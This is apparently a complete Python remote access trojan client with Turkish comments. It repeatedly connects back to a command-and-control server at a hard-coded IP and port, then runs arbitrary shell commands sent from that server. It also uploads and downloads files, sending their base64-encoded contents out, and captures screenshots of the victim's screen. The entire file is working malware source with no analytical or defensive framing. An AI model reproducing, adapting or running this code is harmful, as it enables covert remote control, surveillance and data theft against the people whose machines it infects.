import socket
import os
import subprocess
import base64
from PIL import ImageGrab

HOST = "192.168.0.109"  # C2 sunucusunun IP adresi (panelin IP'si)
PORT = 4444  # C2 sunucusunun portu

def reliable_recv(sock):
    data = b""
    while True:
        try:
            part = sock.recv(4096)
            if not part:
                break
            data += part
            if data.endswith(b"<END>"):
                break
        except:
            break
    return data.replace(b"<END>", b"")

def reliable_send(sock, data):
    sock.sendall(data + b"<END>")

def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")
    return "screenshot.png"

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            break
        except:
            continue

    while True:
        command = reliable_recv(s).decode('utf-8')

        if command.strip() == "exit":
            break

        elif command.startswith("cd "):
            try:
                os.chdir(command[3:].strip())
                result = f"[+] Changed directory to {os.getcwd()}"
            except Exception as e:
                result = f"[-] {str(e)}"

        elif command.startswith("download "):
            filename = command[9:].strip()
            if os.path.exists(filename):
                with open(filename, "rb") as f:
                    content = base64.b64encode(f.read())
                reliable_send(s, content)  # Şifreleme yok
                continue
            else:
                result = f"[-] File {filename} not found"

        elif command.startswith("upload "):
            filename = command[7:].strip()
            filedata = reliable_recv(s)
            with open(filename, "wb") as f:
                f.write(base64.b64decode(filedata))
            result = f"[+] Uploaded {filename}"

        elif command.strip() == "screenshot":
            path = take_screenshot()
            with open(path, "rb") as f:
                content = base64.b64encode(f.read())
            reliable_send(s, content)  # Şifreleme yok
            continue

        else:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                result = output.decode()
            except Exception as e:
                result = f"[-] {str(e)}"

        reliable_send(s, result.encode())  # Şifreleme yok

    s.close()

if __name__ == "__main__":
    connect()
